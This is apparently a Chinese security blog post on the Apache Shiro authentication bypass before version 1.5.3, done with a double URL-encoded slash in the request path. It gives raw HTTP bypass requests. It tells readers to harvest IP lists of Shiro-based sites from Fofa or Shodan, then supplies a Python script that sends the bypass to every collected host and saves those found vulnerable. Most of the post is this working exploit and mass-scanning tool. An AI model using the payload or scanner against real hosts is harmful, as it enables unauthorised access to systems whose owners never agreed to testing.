## **漏洞详情**

Apache
Shiro是一个强大且易用的Java安全框架，它可以用来执行身份验证、授权、密码和会话管理。目前常见集成于各种应用中进行身份验证，授权等。在Apache
Shiro 1.5.3之前的版本，将Apache Shiro与Spring控制器一起使用时，特制请求可能会导致身份验证绕过。  
漏洞影响范围  
Apache Shiro < 1.5.3  
Spring 框架中只使用 Shiro 鉴权

正常情况下发送如下请求会跳转

    
    
    GET /hello/aaa HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close
    Upgrade-Insecure-Requests: 1
    

但因为存在此漏洞,可以通过url双编码的方式来绕过。

`/ -> %2f ->%25%32%66`

发送下面的请求

    
    
    GET /hello/a%25%32%66a HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close
    Upgrade-Insecure-Requests: 1
    

可以绕过身份验证  
![image.png](https://image.3001.net/images/20210929/1632918939_61545d9b397aec33f519c.png!small)

 **批量验证POC**

首先你的有一个采用shiro安全框架的ip字典库,可以使用fofa,shoden等引擎搜索:  
![image.png](https://image.3001.net/images/20210929/1632919126_61545e56c073ffdaecbc5.png!small)

用FofaCollect工具导出为IP.txt

![image.png](https://image.3001.net/images/20210929/1632919247_61545ecf414abc45a8211.png!small)

    
    
    import requests
    import re
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    
    ip = []  # 用于存放存在漏洞的URL地址
    
    def POC_1(target_url) -> bool:
        vuln_url = target_url + "/hello/a%25%32%66a"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
            # 漏洞验证成功的条件
            if "hello" in response.text and response.status_code == 200:
                print("\033[32m[o] 目标 {}存在漏洞 \n[o] 响应地址: {} \033[0m".format(target_url, vuln_url))
                ip.append(vuln_url)
            else:
                print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
        except Exception as e:
            print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))
    
    
    if __name__ == '__main__':
        # title()
        with open('ip.txt', 'r', encoding='utf-8') as f:
            g = f.read()
        a = re.findall('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}[:]\d+', g)  # 提取为IP:PORT的形式
    
        # 逐个验证IP.txt
        for i in a:
            if 'http' in i:
                target_url = str(i)
            else:
                target_url = 'http://' + str(i)
            print(target_url)
            core_name = POC_1(target_url)
    
        # 将存在漏洞的URL写入urls.txt
        with open("urls.txt", "w") as f:
            for i in ip:
                if i != '':
                    f.write(i + "\n")
    
        print(ip)  # 最终打印所有存在漏洞的IP
    

根据以往的POC修改,各位大佬全当路过

